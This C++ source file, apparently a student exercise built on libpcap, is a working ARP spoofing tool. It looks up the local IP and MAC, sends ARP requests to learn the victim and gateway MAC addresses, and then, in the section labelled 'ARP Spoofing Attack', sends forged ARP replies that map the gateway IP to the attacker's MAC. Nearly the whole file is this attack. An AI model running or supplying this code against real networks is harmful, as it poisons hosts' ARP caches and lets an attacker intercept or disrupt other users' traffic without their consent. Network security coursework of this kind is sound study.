#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <stdint.h>

#define MAC_len 6

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test ens33\n");
}

int GetIpAdd (const char * ifr, unsigned char * out) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");
        return -1;
    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

    close(sockfd);

    return 4;
}

int GetMacAdd(const char *ifname, uint8_t *mac_addr)
{
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret < 0)
    {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_len);

    close(sockfd);

    return 0;
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        usage();
        return -1;
    }
    else if (argc % 2 != 0){
        printf("input type = <interface> <sender1 ip> <target1 ip> <sender2 ip> <target2 ip> ...\n");
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    //IP
    uint8_t attack_ip0[4];
    GetIpAdd(argv[1], attack_ip0);
    uint32_t attack_ip = ((attack_ip0[0] << 24) | (attack_ip0[1] << 16) | (attack_ip0[2]<< 8) | (attack_ip0[3]));

    //MAC
    uint8_t attack_mac[MAC_len];
    GetMacAdd(argv[1], attack_mac);
    uint8_t target_mac[argc-2][MAC_len];

    EthArpPacket req_packet;

    req_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    req_packet.eth_.smac_ = Mac(attack_mac);
    req_packet.eth_.type_ = htons(EthHdr::Arp);
    req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_packet.arp_.pro_ = htons(EthHdr::Ip4);
    req_packet.arp_.hln_ = Mac::SIZE;
    req_packet.arp_.pln_ = Ip::SIZE;
    req_packet.arp_.op_ = htons(ArpHdr::Request);
    req_packet.arp_.smac_ = Mac(attack_mac);
    req_packet.arp_.sip_ = htonl(Ip(attack_ip));
    req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");

    //ARP Request Packet
    for(int i = 2; i < argc; i++)
    {   
        req_packet.arp_.tip_ = htonl(Ip(argv[i]));
        int iscontinue = 1;
        while(iscontinue)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
            printf("\nSend ARP Packet!! >> %s\n", argv[i]);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            for(int j = 0; j < 5; j++)
            {
                pcap_next_ex(handle, &header, &packet);
                EthArpPacket *reply_packet = (EthArpPacket*)packet;
                if((ntohl(reply_packet->arp_.sip_) == Ip(argv[i])) && (ntohs(reply_packet->eth_.type_) == EthHdr::Arp) && (ntohs(reply_packet->arp_.op_) == ArpHdr::Reply))
                {
                    memcpy(target_mac[i-2], packet + MAC_len, MAC_len);
                    printf("Get Mac(%s): ", argv[i]);
                    for(int k = 0; k < MAC_len; k++) printf("%02x ", target_mac[i-2][k]);
                    printf("\n\n\n");
                    iscontinue = 0;
                    break;
                }
            }
        }
    }
    int j = 1;
    printf("**Finish ARP**\n");
    printf("[Number]\t[IP]\t\t\t\t[MAC]\n");
    for(int i = 2; i<argc; i++)
    {
        if(i % 2 == 0) printf("%d\t\t%s\t\t\t", j, argv[i]);
        else
        {
            printf("%d\t\t%s(Gateway)\t\t", j,argv[i]);
            j++;
        }
        for(int j = 0; j < MAC_len; j++) printf("%02x ", target_mac[i-2][j]);
        printf("\n");
    }

    printf("\n\n**ARP Spoofing Attack**\n");
    printf("===========================================\n\n");

    for(int i = 2; i<argc-1; i+=2)
    {
        EthArpPacket arp_spoof_packet;

        arp_spoof_packet.eth_.dmac_ = Mac(target_mac[i-2]);
        arp_spoof_packet.eth_.smac_ = Mac(attack_mac);
        arp_spoof_packet.eth_.type_ = htons(EthHdr::Arp);
        arp_spoof_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        arp_spoof_packet.arp_.pro_ = htons(EthHdr::Ip4);
        arp_spoof_packet.arp_.hln_ = Mac::SIZE;
        arp_spoof_packet.arp_.pln_ = Ip::SIZE;
        arp_spoof_packet.arp_.op_ = htons(ArpHdr::Reply);
        arp_spoof_packet.arp_.smac_ = Mac(attack_mac);
        arp_spoof_packet.arp_.sip_ = htonl(Ip(argv[i+1])); //Gateway
        arp_spoof_packet.arp_.tmac_ = Mac(target_mac[i-2]);
        arp_spoof_packet.arp_.tip_ = htonl(Ip(argv[i]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_spoof_packet), sizeof(EthArpPacket));
        printf("\nSend ARP Spoof Packet!! >> %s\n",argv[i]);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n\n", res, pcap_geterr(handle));
        }
    }
    printf("\n\n===========================================\n\n\n");

    pcap_close(handle);
}
